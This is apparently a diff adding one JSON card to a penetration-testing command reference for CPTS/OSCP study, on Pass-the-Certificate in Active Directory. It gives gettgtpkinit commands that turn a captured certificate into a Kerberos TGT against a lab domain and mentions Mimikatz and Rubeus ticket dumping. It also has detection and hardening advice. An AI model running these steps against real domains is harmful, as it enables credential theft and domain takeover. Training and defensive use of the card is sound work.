@@ -1,0 +1,93 @@
+{
+  "id": "ptc-gettgt",
+  "name": "PKINITtools - Get TGT from Certificate",
+  "command": "python3 gettgtpkinit.py -cert-pfx <file.pfx> -pfx-pass '<pfx_pass>' -dc-ip <dc_ip> <domain>/<user> <output.ccache>",
+  "description": "Uses a PFX certificate (from ADCS relay or shadow credentials) to request a Kerberos TGT via PKINIT. Set KRB5CCNAME to the resulting ccache, then authenticate to services or run DCSync as the certificate's principal.",
+  "platform": "linux",
+  "requires": [
+    "ticket"
+  ],
+  "protocols": [
+    "tcp"
+  ],
+  "tools": [
+    "pkinittools"
+  ],
+  "tags": [
+    "pkinit",
+    "certificate",
+    "kerberos",
+    "tgt"
+  ],
+  "category": "Lateral Movement",
+  "subcategory": "Pass the Certificate",
+  "certifications": [
+    "CPTS",
+    "OSCP"
+  ],
+  "primary_cert": "CPTS",
+  "source": "CPTS Module 10: Password Attacks",
+  "examples": [
+    {
+      "label": "Request a TGT from the PFX cert",
+      "command": "python3 gettgtpkinit.py -cert-pfx ../krbrelayx/DC01\\$.pfx -dc-ip 10.129.234.109 'inlanefreight.local/dc01$' /tmp/dc.ccache"
+    },
+    {
+      "label": "Point Kerberos at the new ccache",
+      "command": "export KRB5CCNAME=/tmp/dc.ccache"
+    }
+  ],
+  "notes": "Pass-the-Certificate: use a captured/forged cert (PKINIT) to request a TGT (gettgtpkinit/certipy) - cert-based auth survives password resets. Feeds into DCSync/PtT.\nAlso covered in: OSCP PEN-200 Chapter 19 (Password Attacks)",
+  "references": [
+    {
+      "title": "HTB Academy - Password Attacks",
+      "url": "https://academy.hackthebox.com/module/details/147"
+    },
+    {
+      "title": "PKINITtools",
+      "url": "https://github.com/dirkjanm/PKINITtools"
+    },
+    {
+      "title": "OffSec PEN-200",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "ptc-dcsync",
+      "note": "Dump domain hashes using the TGT.",
+      "rel": "next"
+    },
+    {
+      "id": "ptt-linux",
+      "note": "On domain-joined Linux, reuse Kerberos credentials from ccache files (usually /tmp/krb5cc_*) or keytab files.",
+      "rel": "next"
+    },
+    {
+      "id": "rubeus-ptt",
+      "note": "Rubeus handles Kerberos ticket abuse on Windows.",
+      "rel": "next"
+    }
+  ],
+  "opsec": "loud",
+  "mitre": [
+    "T1649"
+  ],
+  "exam": "exam-ok",
+  "defense": {
+    "why_it_works": "A valid client-auth certificate is exchanged for a Kerberos TGT via PKINIT (Rubeus asktgt /certificate, gettgtpkinit) - authenticating as the certificate's identity without a password.",
+    "prerequisites": "A client-authentication certificate for the target principal (from ADCS abuse or theft).",
+    "impact": "A TGT as the certificate's principal (often a privileged user/DC) - password-independent domain access.",
+    "detection": "[MITRE T1649] Certificate-based Kerberos auth (PKINIT): 4768 with a certificate; on the CA, 4886/4887 certificate requests where the SAN != requester; abnormal certificate issuance; ntlmrelay to ADCS shows a relayed request from a non-DC IP.",
+    "artifacts": "A PKINIT 4768 (certificate logon); the .pfx/TGT; Rubeus/gettgtpkinit execution.",
+    "prevention": "Harden ADCS templates (remove ENROLLEE_SUPPLIES_SUBJECT, require manager approval, restrict enrollment); enforce HTTPS + Extended Protection on web enrollment (ESC8); monitor 4886/4887 and PKINIT logons; restrict who can enroll.",
+    "evasion": "Certificates are long-lived and reusable offline; PKINIT looks like smart-card logon, blending with legitimate certificate auth.",
+    "sources": [
+      "HTB M10",
+      "MITRE T1649"
+    ],
+    "misconfiguration": "Pass-the-Certificate (PtC) attacks exploit ADCS certificate abuse (ESC1/ESC8) combined with Kerberos PKINIT. Shadow credentials (pywhisker) exploit write access to msDS-KeyCredentialLink to add a certificate-based authentication mechanism to any account. Pass-the-Ticket works because Kerberos tickets are extractable from LSASS memory.",
+    "vulnerable_config": "# msDS-KeyCredentialLink writable by attacker (GenericWrite on target account):\n# pywhisker.py -t targetuser -a add\n# Adds a fake device credential -> obtain certificate for targetuser\n# -> PKINIT TGT as targetuser -> NTLM hash via UnPAC\n\n# LSASS memory contains TGTs for all logged-in users:\n# Mimikatz: sekurlsa::tickets /export\n# Rubeus: dump /all",
+    "secure_config": "# Prevent msDS-KeyCredentialLink abuse:\n# Audit who has GenericWrite on privileged accounts\n# Only SYSTEM/DCs should write msDS-KeyCredentialLink\nGet-ObjectAcl -Identity admin -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match 'Write'}\n\n# Prevent ticket extraction:\n# Enable Credential Guard (blocks LSASS memory reads)\n# Protected Users group members: tickets not cached in LSASS\n\n# ADCS: prevent ESC1/ESC8 (see those cards)\n# Monitor: Event 4768 with certificate auth, Event 4769 unusual ticket lifetimes"
+  }
+}
